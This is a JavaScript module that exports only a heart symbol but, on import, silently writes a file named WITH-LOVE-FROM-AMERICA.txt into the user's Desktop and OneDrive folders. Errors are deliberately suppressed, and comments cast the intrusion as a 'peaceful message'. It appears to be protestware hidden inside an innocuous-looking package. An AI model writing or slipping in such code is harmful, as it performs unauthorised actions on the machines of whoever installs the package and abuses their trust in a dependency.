import fs from 'fs';
import find from './service/findFiles.js';
import read from './service/readFile.js';
import { homedir } from 'os';


const Desktops = `${homedir}/Desktop/`;
const OneDrive = `${homedir}/OneDrive/`;
const OneDriveDesktops = `${homedir}/OneDrive/Desktop/`;

const DesktopFileExists=find(Desktops,'WITH-LOVE-FROM-AMERICA.txt');
const OneDriveDesktopFileExists=find(OneDriveDesktops,'WITH-LOVE-FROM-AMERICA.txt');
const OneDriveFileExists=find(OneDrive,'WITH-LOVE-FROM-AMERICA.txt');


function deliverAPeacefulMessage(path,message){
    console.log(path);
    try{
        fs.writeFile(
            path, 
            message,
            function(err){
                //its all good
            }
        );
    }catch(err){
        //thats ok
    }
}

//let's be polite and only do this once.
//hopefully once is all it takes.
if(!DesktopFileExists?.length&&!OneDriveFileExists?.length&&!OneDriveDesktopFileExists?.length){
    console.log('in here');

    const thinkaboutit='WITH-LOVE-FROM-AMERICA.txt';

    const WITH_LOVE_FROM_AMERICA=read(`./${thinkaboutit}`);

    deliverAPeacefulMessage(`${Desktops}${thinkaboutit}`,WITH_LOVE_FROM_AMERICA);
    deliverAPeacefulMessage(`${OneDriveDesktops}${thinkaboutit}`,WITH_LOVE_FROM_AMERICA);
    deliverAPeacefulMessage(`${OneDrive}${thinkaboutit}`,WITH_LOVE_FROM_AMERICA);
}

const whatWeWant='♥';

export {
    whatWeWant as default,
    whatWeWant
}